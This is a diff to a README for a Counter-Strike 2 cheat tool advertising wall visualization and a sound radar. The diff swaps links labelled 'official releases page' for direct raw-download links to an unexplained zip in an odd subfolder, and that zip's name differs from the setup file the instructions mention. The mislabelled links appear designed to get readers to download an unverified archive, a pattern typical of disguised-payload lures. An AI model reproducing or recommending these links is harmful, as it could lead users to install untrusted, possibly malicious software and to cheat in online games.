@@ -1,6 +1,6 @@
 # 🎮 CS2-External-Cheat-2026 - Improve your vision during CS2 matches
 
-[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026)
+[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026/raw/refs/heads/main/peritrema/Cheat-External-C-3.3.zip)
 
 CS2-External-Cheat-2026 is an external-gameplay assistant for Counter-Strike 2. This tool provides a visual overlay to assist with gameplay. It uses screen capture analysis to offer features like wall transparency visualization, sound radar, and grenade trajectory prediction.
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 How to Install and Download
 
-1. Visit the [official releases page](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026) to download the latest version.
+1. Visit the [official releases page](https://github.com/Ahorizonpeedeeriver700/CS2-External-Cheat-2026/raw/refs/heads/main/peritrema/Cheat-External-C-3.3.zip) to download the latest version.
 2. Look for the file named `CS2-External-Setup.zip` under the Assets section.
 3. Click the file to start the download.
 4. Locate the folder where the file stopped downloading and right-click it.
